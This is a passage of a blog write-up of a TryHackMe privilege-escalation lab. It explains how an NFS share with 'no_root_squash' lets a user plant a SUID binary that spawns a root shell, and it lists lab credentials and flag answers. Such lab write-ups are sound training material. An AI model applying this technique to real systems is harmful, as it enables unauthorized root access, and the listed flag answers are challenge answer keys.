    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746554479327/963e50da-57ab-4fdc-af24-e87c40d900de.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746554534177/96e4bbc0-5e43-4e8b-b554-b1ce8368c2a4.png align="center")
    
3. What is the content of the flag6.txt file? `THM-736628929`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746554569090/925c822b-eba4-4768-b6be-b806cb81a4f1.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746554608020/80ed1c70-5b31-490e-9bd8-d7e888e40a29.png align="center")
    

## Privilege Escalation: NFS  
**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.  
  
Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.  
  
NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

![](https://i.imgur.com/irDQTze.png align="left")

The critical element for this privilege escalation vector is the “no\_root\_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no\_root\_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  
  
We will start by enumerating mountable shares from our attacking machine.

![](https://i.imgur.com/CmXPDcv.png align="left")

We will mount one of the “no\_root\_squash” shares to our attacking machine and start building our executable.

![](https://i.imgur.com/DwAB1qs.png align="left")

As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.

![](https://i.imgur.com/nWKpFkK.png align="left")

Once we compile the code we will set the SUID bit.

![](https://i.imgur.com/rkZOOjZ.png align="left")

You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).

![](https://i.imgur.com/U7IjT38.png align="left")

Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.

### Answer the questions below

1. How many mountable shares can you identify on the target system? `3`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746554763266/4d03319b-fce9-41d2-95df-81f841552941.png align="center")
    
2. How many shares have the "no\_root\_squash" option enabled? `3`
    
3. Gain a root shell on the target system
    
4. What is the content of the flag7.txt file? `THM-89384012`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746555442616/e1d38665-d9b7-45c0-9fdc-49d14c17a54e.png align="center")
    

## Capstone Challenge

Thank you for reading my article. Please leave any questions or comments on improving my learning journey and the THM challenges.

Thank you for reading my article. Please leave any questions or comments on improving my learning journey and the THM challenges.